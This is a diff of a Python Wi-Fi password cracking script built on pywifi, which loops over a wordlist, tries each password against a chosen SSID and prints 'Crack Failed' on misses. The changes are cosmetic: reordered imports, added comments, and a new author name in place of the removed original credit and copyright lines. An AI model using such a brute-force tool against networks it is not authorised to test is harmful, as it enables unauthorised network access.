@@ -1,10 +1,14 @@
-import argparse
-import sys
+# __Author__ __Lencof__
+# Wifi_Password Modified №5.py
+
 import os
-import os.path
-import platform
 import re
+import sys
 import time
+import os.path
+import argparse
+import platform
+
 try:
     import pywifi
     from pywifi import PyWiFi
@@ -12,11 +16,6 @@ try:
     from pywifi import Profile
 except:
     print("Installing pywifi")
-
-
-# By Brahim Jarrar ~
-# GITHUB : https://github.com/BrahimJarrar/ ~
-# CopyRight 2019 ~
 
 RED   = "\033[1;31m"  
 BLUE  = "\033[1;34m"
@@ -42,6 +41,7 @@ except:
 
 type = False
 
+# create def main(ssid, password, number)
 def main(ssid, password, number):
 
     profile = Profile() 
@@ -67,6 +67,7 @@ def main(ssid, password, number):
     else:
         print(RED, '[{}] Crack Failed using {}'.format(number, password))
 
+# create def pwd(ssid, file)
 def pwd(ssid, file):
     number = 0
     with open(file, 'r', encoding='utf8') as words:
@@ -77,7 +78,7 @@ def pwd(ssid, file):
             main(ssid, pwd, number)
                     
 
-
+# create def menu():
 def menu():
     parser = argparse.ArgumentParser(description='argparse Example')
 
@@ -123,4 +124,4 @@ def menu():
 
 
 if __name__ == "__main__":
-    menu()
+    menu() # close
